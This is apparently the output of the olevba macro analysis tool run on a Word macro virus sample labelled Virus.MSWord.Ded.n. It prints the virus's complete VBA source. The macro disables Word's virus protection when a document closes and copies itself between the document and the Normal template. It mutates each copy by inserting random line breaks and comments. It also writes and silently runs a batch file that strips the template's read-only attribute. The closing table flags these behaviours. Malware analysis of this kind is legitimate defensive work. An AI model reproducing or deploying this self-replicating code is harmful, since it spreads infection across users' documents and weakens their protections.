olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.n-2864a47f00844066b4b047b77c02a798db199608
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.n-2864a47f00844066b4b047b77c02a798db199608 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
         Private Sub _
Čäĺíňčôčęŕňîđ()

       End Sub
'32,53643
      Private Sub Document_New()
'56,47803
   End Sub
'16,55861
              Private Sub Document_Close()
'79,51863
            On Error GoTo skam
'91,58826
      Options.VirusProtection = False
'29,83842
     SWL
'65,7173
 ABS99
'56,80744
skam:
'38,792
              End Sub
'58,57259
 Private Sub SWL()
'16,32377
     Application. _
                                       ShowVisualBasicEditor = False

           If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

        For I = _
1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

     If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

      While _
Mid(d, Len(d) - 1, 2) = " _"

         I = I + 1
'9,969765
      d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  Wend
'53,78906
     d = _
e(d)

       ActiveDocument. _
                                                              VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

       End If
'77,81191
       Next _
I

  ActiveDocument. _
                               SaveAs AddToRecentFiles:=False

     End If
'63,28266
      End Sub
'66,74683
       Private Sub ABS99()
'84,51047
     If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

            f _
(NormalTemplate.FullName)

           For I = 1 To _
ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

              d = _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

             While Mid(d, _
Len(d) - 1, 2) = " _"

        I _
= I + 1

    d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

         Wend
'75,98818
              d _
= e(d)

              NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

     End _
If

       Next I
'35,1809
      NormalTemplate. _
                                      Save

   End If
'38,5231
      End Sub
'17,94019
          Private Function e(aString) As String
'48,93726
   aString _
= LTrim(aString)

        aString = _
RTrim(aString)

             If aString _
= "Sub " & "Vc()" Then

          aString = "Sub " & "ViewVBCode()"
'55,25579
             Else
'34,18908
  If aString = "Sub " & "ViewVBCode()" Then
'12,61731
       aString _
= "Sub " & "Vc()"

  End If
'40,23238
           End _
If

     For I = 1 _
To Len(aString) - 1

          If Mid(aString, _
I, 1) = "." Then

        If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

             If _
Not Mid(aString, I + 1, 1) = Chr$(34) Then

          e = Left(aString, I - 1) _
& ". _" & Chr$(13) & Right(aString, Len(aString) - I)

             For _
j = 1 To Int(15 * Rnd)

       e _
= " " & e

           Next j
'30,92081
             Exit Function
'99,65449
             End _
If

       End If
'16,03783
       Else
'84,76658
   If Mid(aString, I, _
1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

     If Not _
Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

 e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

        For _
j = 1 To Int(15 * Rnd)

        e = " " & e
'60,19945
   Next _
j

      Exit Function
'48,30573
             End _
If

            End If
'97,55469
        End If
'9,171825
           Next I
'1,255548
    e = aString _
& Chr$(13) & "'" & (100 * Rnd)

       Count = Int(15 * Rnd)
'74,04691
 For j = 1 _
To Count

      e _
= " " & e

Next j
'33,35198
             End _
Function

            Private _
Sub f(fName)

         If _
GetAttr(fName) And vbReadOnly Then

      Open _
Dir(fName) & ".bat" For Append As #1

            Print #1, "Attrib " & "-r " & _
Chr$(34) & fName & Chr$(34)

       Print #1, "del " & Chr$(34) & _
Dir(fName) & ".bat" & Chr$(34)

Close #1
'26,54461
          shellResult = Shell(Dir(fName) _
& ".bat", vbHide)

          End _
If

End Sub
'41,34404
       Private Sub _
Document_Open()

     End _
Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

